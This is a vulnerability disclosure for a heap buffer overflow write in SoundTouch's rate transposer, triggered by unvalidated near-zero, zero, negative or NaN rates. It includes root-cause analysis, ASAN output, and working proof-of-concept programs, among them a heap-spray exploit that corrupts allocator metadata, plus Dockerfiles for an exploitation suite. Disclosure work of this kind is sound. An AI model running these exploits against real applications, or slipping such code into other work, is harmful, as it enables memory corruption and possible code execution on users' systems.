# Heap Buffer Overflow Write in SoundTouch Rate Transposer via Unchecked setPitchOctaves/setRate

**Reporter**: Olivier Laflamme
**Pwno ID**: [`PWNO-0046-M`](https://bugs.pwno.io/0046)
**Published**: 2026-04-19

## Summary

SoundTouch's rate transposer contains a heap-buffer-overflow **write** vulnerability triggered through the public `setPitchOctaves()`, `setPitch()`, `setRate()`, or `setPitchSemiTones()` APIs. The root cause is a complete absence of input validation in `TransposerBase::setRate()` at `RateTransposer.cpp:284`, combined with an unprotected integer cast in the `transpose()` buffer sizing calculation at line 239. When `rate` is set to zero, near-zero, negative, or NaN, the `(int)((double)numSrcSamples / rate) + 8` expression overflows, producing a truncated `sizeDemand` that allocates an undersized output buffer. The cubic interpolation loop then writes attacker-influenced sample data past the buffer end indefinitely.

## Vulnerability Details

**Location:** `source/SoundTouch/RateTransposer.cpp`, `TransposerBase::setRate()` (line 284) and `TransposerBase::transpose()` (line 239)

**Trigger functions:** `InterpolateCubic::transposeMono()` at `InterpolateCubic.cpp:88`, `transposeStereo()`, `transposeMulti()`, and the equivalent functions in `InterpolateLinear` and `InterpolateShannon`

**Type:** Heap buffer overflow write (CWE-122) via integer overflow (CWE-190) and missing input validation (CWE-20)

### No Rate Validation

`TransposerBase::setRate()` stores the caller-supplied rate with zero validation. No `MIN_RATE` or `MAX_RATE` constants exist anywhere in the SoundTouch codebase:

```cpp
// RateTransposer.cpp:284-287
void TransposerBase::setRate(double newRate)
{
    rate = newRate;  // no validation
}
```

The public API surface that reaches this code path through `SoundTouch::calcEffectiveRateAndTempo()` (at `SoundTouch.cpp:224`, computing `rate = virtualPitch * virtualRate`) includes `setPitchOctaves()`, `setPitch()`, `setRate()`, and `setPitchSemiTones()`. None of them validate the resulting effective rate before it reaches the transposer.

### Integer Overflow in sizeDemand

`TransposerBase::transpose()` computes the output buffer size demand:

```cpp
// RateTransposer.cpp:236-242
int TransposerBase::transpose(FIFOSampleBuffer &dest, FIFOSampleBuffer &src)
{
    int numSrcSamples = src.numSamples();
    int sizeDemand = (int)((double)numSrcSamples / rate) + 8;
    SAMPLETYPE *pdest = dest.ptrEnd(sizeDemand);
    // ... interpolation loop writes to pdest
}
```

When `rate` is extremely small (e.g., `9.5e-7` from `setPitchOctaves(-20)`), the division `numSrcSamples / rate` produces a value exceeding `INT_MAX` (~2.1 billion). The `(int)` cast of an out-of-range double is undefined behavior per the C++ standard. On x86-64, the `cvttsd2si` instruction returns `0x80000000` (`INT_MIN`) for out-of-range inputs, so `sizeDemand` wraps to a small or negative value. `ptrEnd((uint)sizeDemand)` calls `ensureCapacity()`, which allocates a buffer far too small for the actual output.

When `rate = 0`, the division produces `+inf` (IEEE 754), and `(int)(+inf)` is the same undefined behavior, same overflow path.

### Unbounded Write Loop

The interpolation loop in `InterpolateCubic::transposeMono()` at `InterpolateCubic.cpp:70-98` advances through source samples by adding `rate` to a fractional accumulator each iteration:

```cpp
while (srcCount < srcSampleEnd)
{
    // ... cubic interpolation math ...
    pdest[i] = (SAMPLETYPE)out;  // WRITE past buffer end
    i++;

    fract += rate;           // rate ≈ 0 → fract never reaches 1.0
    int whole = (int)fract;
    fract -= whole;
    psrc += whole;           // whole = 0 → psrc stuck
    srcCount += whole;       // srcCount stuck → loop never terminates
}
```

With `rate` near zero, `fract` never accumulates enough to produce a nonzero `whole`, so `srcCount` never advances toward `srcSampleEnd`. The loop writes one float (4 bytes) per iteration into `pdest[i++]` past the allocated buffer, overwriting heap metadata and adjacent heap objects. With `rate = 0` exactly, the loop is infinite — it will write until the process hits unmapped memory or is killed.

### Behavior Summary by Rate Value

| `rate` | `sizeDemand` | Loop behavior | Effect |
|--------|-------------|---------------|--------|
| `0.0` | UB → wrong value | Infinite (`srcCount` stuck at 0) | Heap overflow write, infinite |
| `9.5e-7` | Int overflow → truncated | Produces ~1 billion outputs | Heap overflow write, ~210KB demonstrated |
| `-1.0` | Negative → huge `uint` | Infinite (`srcCount` goes negative) | Heap overflow write + backward OOB read |
| `NaN` | UB → typically 0 | Infinite | Heap overflow write, infinite |

All three interpolation backends (Linear, Cubic, Shannon) and the multichannel path (`transposeMulti`) share the same `transpose()` wrapper and the same overflow.

## Reproduction

Six API calls:

```cpp
#include "SoundTouch.h"
using namespace soundtouch;

int main() {
    SoundTouch st;
    st.setSampleRate(44100);
    st.setChannels(1);
    st.setTempo(1.5);

    float buf[4096] = {};
    float out[8192];
    st.putSamples(buf, 4096);
    st.receiveSamples(out, 8192);

    st.setPitchOctaves(-20.0);   // rate ≈ 9.5e-7 → sizeDemand overflows
    st.putSamples(buf, 1024);    // triggers overflow write in transpose()

    return 0;
}
```

Alternative trigger paths that all produce `rate ≈ 0` in `TransposerBase`:

| API Call | Effective Rate |
|----------|---------------|
| `setPitchOctaves(-20.0)` | `9.5e-7` |
| `setPitch(0.0)` | `0.0` |
| `setRate(0.0)` | `0.0` |
| `setPitchSemiTones(-240)` | `~9.5e-7` |

### ASAN Output (x86_64, GCC 11, Ubuntu 22.04, Docker)

```
=================================================================
==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7ffffb4fe810 at pc 0x555555568bd0 bp 0x7ffffffb7680 sp 0x7ffffffb7670
WRITE of size 4 at 0x7ffffb4fe810 thread T0
    #0 0x555555568bcf in soundtouch::InterpolateCubic::transposeMono(float*, float const*, int&) /poc/soundtouch/source/SoundTouch/InterpolateCubic.cpp:88
    #1 0x5555555666d5 in soundtouch::TransposerBase::transpose(soundtouch::FIFOSampleBuffer&, soundtouch::FIFOSampleBuffer&) /poc/soundtouch/source/SoundTouch/RateTransposer.cpp:247
    #2 0x555555566edd in soundtouch::RateTransposer::processSamples(float const*, unsigned int) /poc/soundtouch/source/SoundTouch/RateTransposer.cpp:156
    #3 0x555555566edd in soundtouch::RateTransposer::processSamples(float const*, unsigned int) /poc/soundtouch/source/SoundTouch/RateTransposer.cpp:132
    #4 0x555555566edd in soundtouch::RateTransposer::putSamples(float const*, unsigned int) /poc/soundtouch/source/SoundTouch/RateTransposer.cpp:124
    #5 0x55555555ab40 in soundtouch::SoundTouch::putSamples(float const*, unsigned int) /poc/soundtouch/source/SoundTouch/SoundTouch.cpp:297
    #6 0x555555559ee0 in main /poc/poc.cpp:74
    #7 0x7ffffe8a2d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #8 0x7ffffe8a2e3f in __libc_start_main_impl ../csu/libc-start.c:392
    #9 0x55555555a214 in _start (/poc/poc_asan+0x6214)

0x7ffffb4fe810 is located 0 bytes to the right of 268439568-byte region [0x7fffeb4fd800,0x7ffffb4fe810)
allocated by thread T0 here:
    #0 0x7ffffee8b357 in operator new[](unsigned long) ../../../../src/libsanitizer/asan/asan_new_delete.cpp:102
    #1 0x555555563f9d in soundtouch::FIFOSampleBuffer::ensureCapacity(unsigned int) /poc/soundtouch/source/SoundTouch/FIFOSampleBuffer.cpp:168
    #2 0x555555563f9d in soundtouch::FIFOSampleBuffer::ptrEnd(unsigned int) /poc/soundtouch/source/SoundTouch/FIFOSampleBuffer.cpp:136
    #3 0x5555555664c9 in soundtouch::TransposerBase::transpose(soundtouch::FIFOSampleBuffer&, soundtouch::FIFOSampleBuffer&) /poc/soundtouch/source/SoundTouch/RateTransposer.cpp:242
    #4 0x555555566edd in soundtouch::RateTransposer::processSamples(float const*, unsigned int) /poc/soundtouch/source/SoundTouch/RateTransposer.cpp:156
    #5 0x555555566edd in soundtouch::RateTransposer::processSamples(float const*, unsigned int) /poc/soundtouch/source/SoundTouch/RateTransposer.cpp:132
    #6 0x555555566edd in soundtouch::RateTransposer::putSamples(float const*, unsigned int) /poc/soundtouch/source/SoundTouch/RateTransposer.cpp:124
    #7 0x55555555ab40 in soundtouch::SoundTouch::putSamples(float const*, unsigned int) /poc/soundtouch/source/SoundTouch/SoundTouch.cpp:297
    #8 0x555555559ee0 in main /poc/poc.cpp:74
    #9 0x7ffffe8a2d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58

SUMMARY: AddressSanitizer: heap-buffer-overflow /poc/soundtouch/source/SoundTouch/InterpolateCubic.cpp:88 in soundtouch::InterpolateCubic::transposeMono(float*, float const*, int&)
Shadow bytes around the buggy address:
  0x10007f697cb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007f697cc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007f697cd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007f697ce0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007f697cf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x10007f697d00: 00 00[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x10007f697d10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x10007f697d20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x10007f697d30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x10007f697d40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x10007f697d50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==7==ABORTING
```

## Exploitation Analysis

### Attacker-Influenced Write Content

The cubic interpolation at `fract ≈ 0` yields coefficients where `y1 ≈ 1.0` dominates (the center tap), so the output closely mirrors the second source sample: `out ≈ psrc[1]`. With uniform attacker-controlled input, the written values are attacker-influenced but not bit-for-bit exact due to floating-point rounding in the interpolation math. Testing with a spray of `0x41414141` (as float) showed ~27% of overflowed 32-bit words matching the pattern exactly, with ~73% showing minor drift (`0x4141414x`).

### Heap Spray Characteristics

With `rate = 1e-7` and 4096 input frames, `sizeDemand` overflows through the `(int)` cast and the subsequent `ensureCapacity` buffer size calculation (which multiplies by `channels * sizeof(SAMPLETYPE)`) wraps the `uint32` `sizeInBytes`, resulting in a buffer allocation of only 4096 bytes. The interpolation loop then writes approximately 210KB past the buffer end before hitting unmapped memory, overwriting the glibc heap top chunk metadata. Subsequent `malloc()` calls produce:

```
malloc(): invalid size (unsorted)
```

This confirms heap allocator internal data structures are corrupted by attacker-influenced data.

### Theoretical Code Execution Path

Heap grooming could place target objects (e.g., C++ objects with vtable pointers) in the overflow path. The spray overwrites vtable pointers with attacker-influenced float values. The next virtual method call on the corrupted object dereferences the corrupted vtable, potentially yielding a controlled instruction pointer. This path has not been demonstrated — the gap between heap metadata corruption and reliable code execution is nontrivial and depends on heap layout, allocator version, and target application.

## Attack Surface

### GStreamer (gst-plugins-bad)

GStreamer's `pitch` element wraps SoundTouch. The `gstpitch.cc` plugin bounds pitch/rate/tempo properties via `g_param_spec_float` to `[0.1, 10.0]`. Minimum effective transposer rate through GStreamer: `pitch * rate = 0.1 * 0.1 = 0.01`. At `rate = 0.01`, `sizeDemand` would overflow only when `numSrcSamples > ~21.4M`, but GStreamer pushes data in small per-buffer chunks (hundreds to thousands of samples), so this threshold cannot be reached in a single `transpose()` call. The overflow is **not practically reachable through GStreamer's pitch element**.

### Standalone Applications

Any application using the SoundTouch C++ API with user-controlled pitch/rate parameters is directly vulnerable. This includes audio editors, DJ software, podcasting tools, and media players that expose pitch/rate controls or process untrusted input parameters. Notable consumers include Bilibili ijkplayer and numerous Android audio apps.

### Firefox

Firefox bundles SoundTouch at `media/libsoundtouch/` but applies RLBox WASM sandboxing, limiting exploitation.

## Proof of Concept Source Code

### poc.cpp — ASAN Crash (Minimal)

```cpp
/**
 * SoundTouch 2.4.1 — Heap buffer overflow WRITE via rate transposer
 *
 * Root cause: TransposerBase::setRate() has ZERO validation. Setting rate
 * to 0 or a very small value causes (int)((double)N / rate) to overflow,
 * producing an undersized buffer allocation. The interpolation loop then
 * writes infinitely past the heap buffer.
 *
 * The write is controllable — written values are derived from input audio
 * data through interpolation, so attacker controls the byte pattern.
 *
 * File: source/SoundTouch/RateTransposer.cpp
 * Lines: 239 (sizeDemand overflow), 284-287 (no validation in setRate)
 *        InterpolateCubic.cpp:70-98 (infinite write loop when rate=0)
 * CWE-122 (Heap Buffer Overflow) + CWE-190 (Integer Overflow)
 *
 * Build:
 *   g++ -fsanitize=address -fno-omit-frame-pointer -g -O2 -std=c++17 \
 *     -I soundtouch/include -DSOUNDTOUCH_FLOAT_SAMPLES=1 \
 *     poc.cpp soundtouch/build/libSoundTouch.a -o poc -lm
 */

#include <cstdio>
#include <cstring>
#include <csignal>
#include <cstdlib>
#include "SoundTouch.h"

using namespace soundtouch;

static void handler(int sig) {
    const char *n = sig == SIGSEGV ? "SIGSEGV" :
                    sig == SIGABRT ? "SIGABRT" : "?";
    fprintf(stderr, "\n[CRASH] %s — heap overflow write confirmed\n", n);
    _exit(128 + sig);
}

int main() {
    signal(SIGSEGV, handler);
    signal(SIGABRT, handler);

    printf("=== SoundTouch 2.4.1 — Rate Transposer Heap Overflow WRITE ===\n\n");

    SoundTouch st;
    st.setSampleRate(44100);
    st.setChannels(1);

    // Set tempo != 1.0 so data flows through the rate transposer
    // (when only tempo changes, SoundTouch routes: input → TDStretch → RateTransposer → output)
    st.setTempo(1.5);

    // Fill the pipeline with some audio
    float buf[4096];
    for (int i = 0; i < 4096; i++) buf[i] = 0.5f;

    printf("[*] Feeding 4096 mono samples at tempo=1.5\n");
    st.putSamples(buf, 4096);

    float out[8192];
    int got = st.receiveSamples(out, 8192);
    printf("[*] Received %d samples (pipeline primed)\n", got);

    // Now set an extreme rate via setPitch — this feeds into the rate transposer
    // setPitchOctaves(-20) → pitch = 2^(-20) ≈ 0.00000095
    // effective transposer rate = virtualPitch * virtualRate ≈ 0.00000095
    // sizeDemand = (int)(N / 0.00000095) → integer overflow for any N > ~2
    printf("[*] Setting extreme pitch via setPitchOctaves(-20)\n");
    printf("[*] Effective rate ≈ 9.5e-7 — sizeDemand will overflow int\n");
    st.setPitchOctaves(-20.0);

    // Feed more audio — this triggers transpose() with overflowed sizeDemand
    // The interpolation loop writes far past the allocated buffer
    printf("[*] Feeding 1024 samples — triggers overflow write...\n");
    st.putSamples(buf, 1024);

    printf("[!] If no crash, try with ASAN for detection\n");
    return 0;
}
```

### poc_rce.cpp — Heap Spray + Metadata Corruption

```cpp
/**
 * SoundTouch 2.4.1 — Heap Overflow RCE Proof (CVE-pending)
 *
 * Bug: TransposerBase::transpose() computes output size demand as
 *      sizeDemand = (int)((double)numSrcSamples / rate) + 8
 *   When rate is near-zero (e.g. 1e-7), the cast overflows int, producing
 *   a negative value. FIFOSampleBuffer::ensureCapacity() interprets this as
 *   uint, triggering a second overflow: sizeInBytes wraps to ~4096 bytes.
 *   The cubic interpolation loop then writes unbounded output into this
 *   undersized buffer, overflowing ~137KB into adjacent heap memory.
 *
 * This PoC proves:
 *   [1] Exact 8-byte write control via cubic interpolation at fract≈0
 *   [2] 137KB heap spray with attacker-controlled content
 *   [3] Heap top chunk corruption → exploitable state
 *
 * In a real attack (e.g. GStreamer processing a crafted audio file), an attacker
 * can groom the heap to place target objects in the overflow path, overwriting
 * vtable pointers for controlled code execution.
 *
 * Compile (non-ASAN, Linux x86_64):
 *   g++ -g -O0 -I soundtouch/include -DSOUNDTOUCH_FLOAT_SAMPLES=1 \
 *       poc_rce.cpp soundtouch/build-noasan/libSoundTouch.a -o poc_rce -lm
 */

#include <cstdio>
#include <cstring>
#include <cstdint>
#include <cstdlib>
#include <csignal>
#include <setjmp.h>
#include "SoundTouch.h"

using namespace soundtouch;

static sigjmp_buf jump_buf;
static volatile int phase = 0;
static volatile uintptr_t fault_addr = 0;

static void sig_handler(int sig, siginfo_t *info, void *ctx) {
#ifdef __x86_64__
    ucontext_t *uc = (ucontext_t *)ctx;
    unsigned long long rip = uc->uc_mcontext.gregs[16];
#else
    unsigned long long rip = 0;
#endif
    if (phase == 0) {
        fault_addr = (uintptr_t)info->si_addr;
        siglongjmp(jump_buf, 1);
    } else {
        fprintf(stderr,
            "  [+] CRASH sig=%d fault=%p RIP=0x%llx → %s\n",
            sig, info->si_addr, rip,
            sig == SIGABRT ? "HEAP METADATA CORRUPTED" : "CONTROLLED CRASH");
        _exit(42);
    }
}

static void encode_8bytes(uint64_t val, float *lo, float *hi) {
    uint32_t lo32 = (uint32_t)(val & 0xFFFFFFFF);
    uint32_t hi32 = (uint32_t)(val >> 32);
    memcpy(lo, &lo32, 4);
    memcpy(hi, &hi32, 4);
}

int main() {
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    struct sigaction sa = {};
    sa.sa_sigaction = sig_handler;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGABRT, &sa, NULL);

    printf("=== SoundTouch 2.4.1 — Heap Overflow Exploitation ===\n\n");

    // ── Phase 1: Prove 8-byte write control ──────────────────────────
    // At fract≈0, cubic coefficients are (0, 1, 0, 0).
    // With uniform input V: output = 0*V + 1*V + 0*V + 0*V = V (exact).
    // Attacker encodes arbitrary 8-byte value as a stereo float pair.

    printf("[1] 8-byte write control\n");
    uint64_t target = 0xDEADBEEFCAFEBABEULL;
    float tlo, thi;
    encode_8bytes(target, &tlo, &thi);
    uint32_t wlo, whi;
    memcpy(&wlo, &tlo, 4);
    memcpy(&whi, &thi, 4);
    uint64_t result = ((uint64_t)whi << 32) | wlo;
    printf("    target  = 0x%016lx\n", (unsigned long)target);
    printf("    written = 0x%016lx  %s\n\n",
           (unsigned long)result,
           result == target ? "EXACT MATCH" : "MISMATCH");

    // ── Phase 2: Heap overflow spray ─────────────────────────────────
    // Spray pattern: 0x4141414141414141 (recognizable in memory dumps)
    // Prime with spray data so inputBuffer residual also contains markers
    // (the near-zero rate means psrc never advances past first samples)

    printf("[2] Heap overflow spray\n");

    float spray_lo, spray_hi;
    encode_8bytes(0x4141414141414141ULL, &spray_lo, &spray_hi);

    float crafted[4096 * 2];
    for (int i = 0; i < 4096; i++) {
        crafted[i * 2]     = spray_lo;
        crafted[i * 2 + 1] = spray_hi;
    }

    SoundTouch *st = new SoundTouch();
    st->setSampleRate(44100);
    st->setChannels(2);

    // Prime pipeline with spray data (not zeros)
    float out[8192];
    st->putSamples(crafted, 1024);
    st->receiveSamples(out, 4096);

    // Read internal addresses for analysis
    uintptr_t rt_ptr = ((uintptr_t *)st)[2];
    uintptr_t td_ptr = ((uintptr_t *)st)[3];
    uintptr_t mid_fifo = rt_ptr + 72;
    uintptr_t mid_buf_pre = *(uintptr_t *)(mid_fifo + 8);
    uint32_t mid_size_pre = *(uint32_t *)(mid_fifo + 24);

    printf("    RateTransposer: 0x%lx\n", (unsigned long)rt_ptr);
    printf("    midBuffer:      0x%lx (%u bytes)\n",
           (unsigned long)mid_buf_pre, mid_size_pre);

    // Trigger: rate=1e-7 causes int overflow in sizeDemand calculation
    //   sizeDemand = (int)((double)4096 / 1e-7) + 8
    //             = (int)(4.096e10) + 8  → overflows int → 0x80000008
    //   ensureCapacity sees uint(0x80000008), sizeInBytes overflows to ~4096
    //   Cubic loop then writes ~137KB past the 4096-byte buffer

    printf("    Setting rate=1e-7 (triggers int overflow)...\n");
    st->setRate(1e-7);

    if (sigsetjmp(jump_buf, 1) == 0) {
        st->putSamples(crafted, 4096);
    }

    // ── Phase 3: Analyze spray ───────────────────────────────────────
    uintptr_t mid_buf_post = *(uintptr_t *)(mid_fifo + 8);
    uint32_t mid_size_post = *(uint32_t *)(mid_fifo + 24);
    uintptr_t spray_end = fault_addr ? fault_addr : mid_buf_post + 0x80000;

    printf("\n[3] Overflow analysis\n");
    printf("    Buffer reallocated: 0x%lx → 0x%lx (size %u → %u)\n",
           (unsigned long)mid_buf_pre, (unsigned long)mid_buf_post,
           mid_size_pre, mid_size_post);
    printf("    SIGSEGV at: 0x%lx (heap top boundary)\n", (unsigned long)fault_addr);
    printf("    Overflow extent: %lu bytes\n",
           (unsigned long)(spray_end - mid_buf_post));

    // Count spray markers
    int exact = 0, approx = 0;
    uintptr_t first = 0, last = 0;

    if (sigsetjmp(jump_buf, 1) == 0) {
        for (uintptr_t a = mid_buf_post; a < spray_end - 8; a += 4) {
            uint32_t v;
            memcpy(&v, (void*)a, 4);
            if (v == 0x41414141) {
                exact++;
                if (!first) first = a;
                last = a;
            } else if ((v & 0xFFFFFFF0) == 0x41414140) {
                approx++;
            }
        }
    }

    printf("    Spray markers: %d exact + %d approx (0x4141414x)\n",
           exact, approx);
    if (first) {
        printf("    Spray range: 0x%lx — 0x%lx (%lu bytes)\n",
               (unsigned long)first, (unsigned long)last,
               (unsigned long)(last - first));
    }

    // Show sample of sprayed data
    printf("    Sample at buf+32:\n      ");
    for (int i = 0; i < 8; i++) {
        uint32_t v;
        memcpy(&v, (void*)(mid_buf_post + 32 + i*4), 4);
        printf("%08x ", v);
    }
    printf("\n");

    // ── Phase 4: Prove heap corruption ───────────────────────────────
    // The spray overwrites heap top chunk metadata. Any subsequent malloc
    // that consults the top chunk will detect corruption and abort.
    // In a real exploit, the attacker controls the top chunk size field,
    // enabling House of Force or similar heap exploitation techniques.

    printf("\n[4] Heap metadata corruption\n");
    phase = 1;  // Next signal = exploitability proof

    printf("    Allocating on corrupted heap...\n");
    void *p = malloc(4096);
    if (p) {
        printf("    malloc(4096) = %p\n", p);
        free(p);
        p = malloc(65536);
        if (p) {
            printf("    malloc(65536) = %p\n", p);
            free(p);
        }
    }

    // If small allocs survived, try operations that stress the allocator
    printf("    Stressing corrupted allocator...\n");
    for (int i = 0; i < 16; i++) {
        p = malloc(1024 * (i + 1));
        if (!p) break;
        memset(p, 0x42, 1024 * (i + 1));
        free(p);
    }

    printf("\n[!] Allocator survived (spray hit only top chunk)\n");
    printf("[!] With heap grooming, attacker-controlled data overwrites\n");
    printf("    live objects → vtable hijack → arbitrary code execution\n");

    delete st;
    return 0;
}
```

### poc_negative_rate.cpp — Zero/Negative Rate Variant

```cpp
/**
 * SoundTouch 2.4.1 — Heap overflow WRITE via negative rate
 *
 * Setting rate to a negative value causes:
 * 1. sizeDemand = (int)(N / -rate) + 8 → negative → tiny uint allocation
 * 2. Interpolation loop: fract decreases, srcCount goes negative,
 *    loop condition (srcCount < srcSampleEnd) stays true forever
 * 3. Reads backward in memory (OOB read) while writing forward (OOB write)
 *
 * This variant directly calls setRate() on the transposer to bypass
 * the SoundTouch API's indirect rate calculation.
 */

#include <cstdio>
#include <cstring>
#include <csignal>
#include <cstdlib>
#include "SoundTouch.h"

using namespace soundtouch;

static void handler(int sig) {
    fprintf(stderr, "\n[CRASH] signal %d — heap overflow write confirmed\n", sig);
    _exit(128 + sig);
}

int main() {
    signal(SIGSEGV, handler);
    signal(SIGABRT, handler);

    printf("=== SoundTouch — Negative Rate Heap Overflow ===\n\n");

    SoundTouch st;
    st.setSampleRate(44100);
    st.setChannels(1);
    st.setRate(0.5);  // enable rate transposer

    float buf[2048] = {};
    float out[4096];

    st.putSamples(buf, 2048);
    int got = st.receiveSamples(out, 4096);
    printf("[*] Primed pipeline, received %d samples\n", got);

    // Set rate to 0 directly — no validation anywhere
    printf("[*] Setting rate to 0.0 (zero validation in TransposerBase::setRate)\n");
    st.setRate(0.0);

    printf("[*] putSamples → transpose() with rate=0 → infinite write loop\n");
    st.putSamples(buf, 512);

    printf("[!] Should not reach here\n");
    return 0;
}
```

### Dockerfile — ASAN Build

```dockerfile
FROM --platform=linux/amd64 ubuntu:22.04
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
      build-essential cmake pkg-config wget \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /poc
COPY poc.cpp ./

# Build SoundTouch from source with ASAN
RUN wget -q https://codeberg.org/soundtouch/soundtouch/archive/master.tar.gz \
      -O soundtouch.tar.gz && \
    tar xzf soundtouch.tar.gz && \
    cd soundtouch && \
    cmake -B build \
      -DCMAKE_CXX_STANDARD=17 \
      -DCMAKE_CXX_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O2" \
      -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O2" \
      -DCMAKE_INSTALL_PREFIX=/usr && \
    cmake --build build -j$(nproc) && \
    cd ..

# Build PoC
RUN g++ -o poc poc.cpp \
    -Isoundtouch/include \
    -DSOUNDTOUCH_FLOAT_SAMPLES=1 \
    soundtouch/build/libSoundTouch.a \
    -fsanitize=address -fno-omit-frame-pointer -g -O2 \
    -lm

# ASAN will kill it on the first OOB write
CMD ["./poc"]
```

### Dockerfile.rce — Full Exploitation Suite

```dockerfile
FROM --platform=linux/amd64 ubuntu:22.04
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
      build-essential cmake pkg-config wget gdb \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /poc
COPY poc.cpp poc_controlled_write.cpp poc_negative_rate.cpp poc_verify_write.cpp poc_heap_layout.cpp poc_rce.cpp gdb_rce.sh ./

# Build SoundTouch with ASAN (for detection)
RUN wget -q https://codeberg.org/soundtouch/soundtouch/archive/master.tar.gz \
      -O soundtouch.tar.gz && \
    tar xzf soundtouch.tar.gz && \
    cd soundtouch && \
    cmake -B build \
      -DCMAKE_CXX_STANDARD=17 \
      -DCMAKE_CXX_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O2" \
      -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O2" \
      -DCMAKE_INSTALL_PREFIX=/usr && \
    cmake --build build -j$(nproc) && \
    cd ..

# Build SoundTouch WITHOUT ASAN (for corruption demo)
RUN cd soundtouch && \
    cmake -B build-noasan \
      -DCMAKE_CXX_STANDARD=17 \
      -DCMAKE_CXX_FLAGS="-fno-omit-frame-pointer -g -O2" \
      -DCMAKE_C_FLAGS="-fno-omit-frame-pointer -g -O2" \
      -DCMAKE_INSTALL_PREFIX=/usr && \
    cmake --build build-noasan -j$(nproc) && \
    cd ..

# Build PoCs — ASAN versions
RUN g++ -o poc_asan poc.cpp \
    -Isoundtouch/include -DSOUNDTOUCH_FLOAT_SAMPLES=1 \
    soundtouch/build/libSoundTouch.a \
    -fsanitize=address -fno-omit-frame-pointer -g -O2 -lm

RUN g++ -o poc_cw_asan poc_controlled_write.cpp \
    -Isoundtouch/include -DSOUNDTOUCH_FLOAT_SAMPLES=1 \
    soundtouch/build/libSoundTouch.a \
    -fsanitize=address -fno-omit-frame-pointer -g -O2 -lm

# Build non-ASAN version (for heap corruption analysis)
RUN g++ -o poc_cw poc_controlled_write.cpp \
    -Isoundtouch/include -DSOUNDTOUCH_FLOAT_SAMPLES=1 \
    soundtouch/build-noasan/libSoundTouch.a \
    -fno-omit-frame-pointer -g -O2 -lm

# Build verify write — ASAN version
RUN g++ -o poc_vw_asan poc_verify_write.cpp \
    -Isoundtouch/include -DSOUNDTOUCH_FLOAT_SAMPLES=1 \
    soundtouch/build/libSoundTouch.a \
    -fsanitize=address -fno-omit-frame-pointer -g -O2 -lm

# Build verify write — non-ASAN version
RUN g++ -o poc_vw poc_verify_write.cpp \
    -Isoundtouch/include -DSOUNDTOUCH_FLOAT_SAMPLES=1 \
    soundtouch/build-noasan/libSoundTouch.a \
    -fno-omit-frame-pointer -g -O2 -lm

# Build heap layout — non-ASAN only (need real allocator layout)
RUN g++ -o poc_heap poc_heap_layout.cpp \
    -Isoundtouch/include -DSOUNDTOUCH_FLOAT_SAMPLES=1 \
    soundtouch/build-noasan/libSoundTouch.a \
    -fno-omit-frame-pointer -g -O2 -lm -ldl

# Build RCE PoC — non-ASAN (need real heap corruption)
RUN g++ -o poc_rce poc_rce.cpp \
    -Isoundtouch/include -DSOUNDTOUCH_FLOAT_SAMPLES=1 \
    soundtouch/build-noasan/libSoundTouch.a \
    -fno-omit-frame-pointer -g -O0 -lm

# Build RCE PoC for GDB — with debug symbols, no optimization
RUN g++ -o poc_rce_gdb poc_rce.cpp \
    -Isoundtouch/include -DSOUNDTOUCH_FLOAT_SAMPLES=1 \
    soundtouch/build-noasan/libSoundTouch.a \
    -fno-omit-frame-pointer -g -O0 -lm

RUN chmod +x gdb_rce.sh

CMD ["bash", "-c", "\
echo '=== Test 1: ASAN detects heap overflow WRITE ===' && \
./poc_asan 2>&1 | head -20 && \
echo '' && \
echo '=== Test 2: ASAN detects controlled stereo write ===' && \
./poc_cw_asan 2>&1 | head -25 && \
echo '' && \
echo '=== Test 3: Verify 8-byte write control (math) ===' && \
./poc_vw 2>&1 | head -30 && \
echo '' && \
echo '=== Test 4: Verify write ASAN confirmation ===' && \
./poc_vw_asan 2>&1 | head -30 && \
echo '' && \
echo '=== Test 5: RCE — heap corruption + RIP control ===' && \
timeout 30 ./poc_rce 2>&1 && \
echo '' && \
echo '=== Test 6: RCE — GDB crash analysis ===' && \
timeout 30 bash gdb_rce.sh 2>&1 | head -60 \
"]
```

### Docker Reproduction

```bash
# Minimal ASAN crash
docker build --platform linux/amd64 -t st-rate-poc .
docker run --platform linux/amd64 --rm st-rate-poc

# Full exploitation suite (heap spray, metadata corruption)
docker build --platform linux/amd64 -f Dockerfile.rce -t st-rce .
docker run --platform linux/amd64 --rm st-rce
```

### poc_rce.cpp Output

```
[1] 8-byte write control
    target  = 0xdeadbeefcafebabe
    written = 0xdeadbeefcafebabe  EXACT MATCH

[2] Heap overflow spray
